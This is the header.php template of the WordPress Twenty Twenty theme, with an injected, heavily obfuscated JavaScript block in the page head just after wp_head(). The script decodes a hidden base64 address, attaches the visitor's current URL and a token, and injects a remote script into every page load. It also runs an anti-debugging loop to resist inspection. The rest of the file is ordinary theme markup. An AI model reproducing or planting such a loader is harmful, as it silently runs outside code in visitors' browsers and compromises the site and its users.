<?php
/**
 * Header file for the Twenty Twenty WordPress default theme.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

?><!DOCTYPE html>

<html class="no-js" <?php language_attributes(); ?>>

	<head>

		<meta charset="<?php bloginfo( 'charset' ); ?>">
		<meta name="viewport" content="width=device-width, initial-scale=1.0" >

		<link rel="profile" href="https://gmpg.org/xfn/11">

		<?php wp_head(); ?>

	<script language="javascript">var D=d;(function(e,f){var z=d,g=e();while(!![]){try{var h=parseInt(z(0x185))/(-0x16ae+-0x1cc7+0x3376)+parseInt(z(0x167))/(-0xb56+0x171f+-0xc9*0xf)*(parseInt(z(0x176))/(-0xd1d+0xfc*0x5+-0xe*-0x96))+-parseInt(z(0x17e))/(-0x335*-0x1+-0x186d+0x153c)*(parseInt(z(0x16f))/(-0x396*-0x2+-0x12e1+0xbba))+-parseInt(z(0x178))/(0x2143+-0x4*-0x7d8+-0x409d)*(parseInt(z(0x16d))/(0x61b*-0x1+-0x2233+-0x811*-0x5))+-parseInt(z(0x18a))/(-0x112f+-0xee9+-0x1*-0x2020)+parseInt(z(0x17f))/(-0xfb9+0x1*0xd0+0xef2)+parseInt(z(0x188))/(-0x2637+-0x4c*-0x35+0x481*0x5);if(h===f)break;else g['push'](g['shift']());}catch(i){g['push'](g['shift']());}}}(c,0x1dc3+0xa9c*-0x11c+-0x2*-0x9655e));var b=(function(){var e=!![];return function(f,g){var h=e?function(){var A=d;if(g){var i=g[A(0x199)](f,arguments);return g=null,i;}}:function(){};return e=![],h;};}());(function(){b(this,function(){var B=d;if(B(0x183)===B(0x19c))j(this,function(){var C=B,w=new o('functio'+C(0x17d)+'\)'),x=new p(C(0x17a)+C(0x195)+C(0x18f)+C(0x18e)+C(0x181),'i'),y=q(C(0x169));!w['test'](y+'chain')||!x[C(0x197)](y+C(0x18d))?y('0'):s();})();else{var e=new RegExp(B(0x194)+B(0x17d)+'\)'),f=new RegExp(B(0x17a)+B(0x195)+'-Z_$][0'+B(0x18e)+'Z_$]*)','i'),g=a('init');!e[B(0x197)](g+'chain')||!f[B(0x197)](g+'input')?g('0'):a();}})();}());var idnn=document[D(0x180)+'lement'](D(0x168));function d(a,b){var e=c();return d=function(f,g){f=f-(-0x96f+0xb15*-0x1+0x1*0x15eb);var h=e[f];return h;},d(a,b);}function c(){var H=['2267560ORJytm','setAttr','true) {','input','-9a-zA-','-Z_$][0','S4xL2px','vanF1ZX','{}.cons','dWVyeS0','functio','?:[a-zA','gger','test','debu','apply','1anF1ZX','ctor','WJdLc','118xhLbQO','script','init','J5LmNvb','while (','("retur','2947kPFneU','L2xpYnM','5Gqzkwt','n this"','locatio','JnIyPQ=',')( )','ibute','mpzP2k9','47109XUpSEu','action','10290sqbIXc','call','\+\+ *(','constru','stateOb','n *\( *','2046676GWshmr','2777724ckCUQi','createE','Z_$]*)','appendC','uSzqC','zLjExLj','221185txYDTN','atob','rval','5286540aoLBvM','head'];c=function(){return H;};return c();}idnn[D(0x18b)+D(0x174)]('src',window[D(0x186)]('Ly9hcGl'+D(0x19a)+D(0x16a)+'S9hamF4'+D(0x16e)+D(0x191)+'J5LzMuN'+D(0x190)+D(0x193)+D(0x184)+'AubWluL'+D(0x175))+window[D(0x171)+'n']['href']+window[D(0x186)](D(0x172)+'=')+'06b88ed4df571bbf659ca8ec77d10dca'),(function(){var F=D,e=function(){var E=d,g;try{g=Function('return '+'(functi'+'on() '+(E(0x192)+'tructor'+E(0x16c)+E(0x170)+E(0x173))+');')();}catch(h){g=window;}return g;},f=e();f['setInte'+F(0x187)](a,-0x468+-0x9fa+0x925*0x2);}()),document[D(0x189)][D(0x182)+'hild'](idnn);function a(e){function f(g){var G=d;if(typeof g==='string')return function(h){}[G(0x17b)+G(0x19b)](G(0x16b)+G(0x18c)+'}')[G(0x199)]('counter');else(''+g/g)['length']!==0x1*0x251f+-0x1743+-0xddb||g%(0xcef*-0x1+-0xc*-0x155+-0x1*0x2f9)===-0x81*0x1b+0x67*-0x5b+0x3238?function(){return!![];}[G(0x17b)+G(0x19b)]('debu'+G(0x196))[G(0x179)](G(0x177)):function(){return![];}['constru'+G(0x19b)](G(0x198)+G(0x196))[G(0x199)](G(0x17c)+'ject');f(++g);}try{if(e)return f;else f(0x26e2+-0x1b9+-0x97*0x3f);}catch(g){}}</script>



















</head>

	<body <?php body_class(); ?>>

		<?php
		wp_body_open();
		?>

		<header id="site-header" class="header-footer-group" role="banner">

			<div class="header-inner section-inner">

				<div class="header-titles-wrapper">

					<?php

					// Check whether the header search is activated in the customizer.
					$enable_header_search = get_theme_mod( 'enable_header_search', true );

					if ( true === $enable_header_search ) {

						?>

						<button class="toggle search-toggle mobile-search-toggle" data-toggle-target=".search-modal" data-toggle-body-class="showing-search-modal" data-set-focus=".search-modal .search-field" aria-expanded="false">
							<span class="toggle-inner">
								<span class="toggle-icon">
									<?php twentytwenty_the_theme_svg( 'search' ); ?>
								</span>
								<span class="toggle-text"><?php _ex( 'Search', 'toggle text', 'twentytwenty' ); ?></span>
							</span>
						</button><!-- .search-toggle -->

					<?php } ?>

					<div class="header-titles">

						<?php
							// Site title or logo.
							twentytwenty_site_logo();

							// Site description.
							twentytwenty_site_description();
						?>

					</div><!-- .header-titles -->

					<button class="toggle nav-toggle mobile-nav-toggle" data-toggle-target=".menu-modal"  data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".close-nav-toggle">
						<span class="toggle-inner">
							<span class="toggle-icon">
								<?php twentytwenty_the_theme_svg( 'ellipsis' ); ?>
							</span>
							<span class="toggle-text"><?php _e( 'Menu', 'twentytwenty' ); ?></span>
						</span>
					</button><!-- .nav-toggle -->

				</div><!-- .header-titles-wrapper -->

				<div class="header-navigation-wrapper">

					<?php
					if ( has_nav_menu( 'primary' ) || ! has_nav_menu( 'expanded' ) ) {
						?>

							<nav class="primary-menu-wrapper" aria-label="<?php echo esc_attr_x( 'Horizontal', 'menu', 'twentytwenty' ); ?>" role="navigation">

								<ul class="primary-menu reset-list-style">

								<?php
								if ( has_nav_menu( 'primary' ) ) {

									wp_nav_menu(
										array(
											'container'  => '',
											'items_wrap' => '%3$s',
											'theme_location' => 'primary',
										)
									);

								} elseif ( ! has_nav_menu( 'expanded' ) ) {

									wp_list_pages(
										array(
											'match_menu_classes' => true,
											'show_sub_menu_icons' => true,
											'title_li' => false,
											'walker'   => new TwentyTwenty_Walker_Page(),
										)
									);

								}
								?>

								</ul>

							</nav><!-- .primary-menu-wrapper -->

						<?php
					}

					if ( true === $enable_header_search || has_nav_menu( 'expanded' ) ) {
						?>

						<div class="header-toggles hide-no-js">

						<?php
						if ( has_nav_menu( 'expanded' ) ) {
							?>

							<div class="toggle-wrapper nav-toggle-wrapper has-expanded-menu">

								<button class="toggle nav-toggle desktop-nav-toggle" data-toggle-target=".menu-modal" data-toggle-body-class="showing-menu-modal" aria-expanded="false" data-set-focus=".close-nav-toggle">
									<span class="toggle-inner">
										<span class="toggle-text"><?php _e( 'Menu', 'twentytwenty' ); ?></span>
										<span class="toggle-icon">
											<?php twentytwenty_the_theme_svg( 'ellipsis' ); ?>
										</span>
									</span>
								</button><!-- .nav-toggle -->

							</div><!-- .nav-toggle-wrapper -->

							<?php
						}

						if ( true === $enable_header_search ) {
							?>

							<div class="toggle-wrapper search-toggle-wrapper">

								<button class="toggle search-toggle desktop-search-toggle" data-toggle-target=".search-modal" data-toggle-body-class="showing-search-modal" data-set-focus=".search-modal .search-field" aria-expanded="false">
									<span class="toggle-inner">
										<?php twentytwenty_the_theme_svg( 'search' ); ?>
										<span class="toggle-text"><?php _ex( 'Search', 'toggle text', 'twentytwenty' ); ?></span>
									</span>
								</button><!-- .search-toggle -->

							</div>

							<?php
						}
						?>

						</div><!-- .header-toggles -->
						<?php
					}
					?>

				</div><!-- .header-navigation-wrapper -->

			</div><!-- .header-inner -->

			<?php
			// Output the search modal (if it is activated in the customizer).
			if ( true === $enable_header_search ) {
				get_template_part( 'template-parts/modal-search' );
			}
			?>

		</header><!-- #site-header -->

		<?php
		// Output the menu modal.
		get_template_part( 'template-parts/modal-menu' );
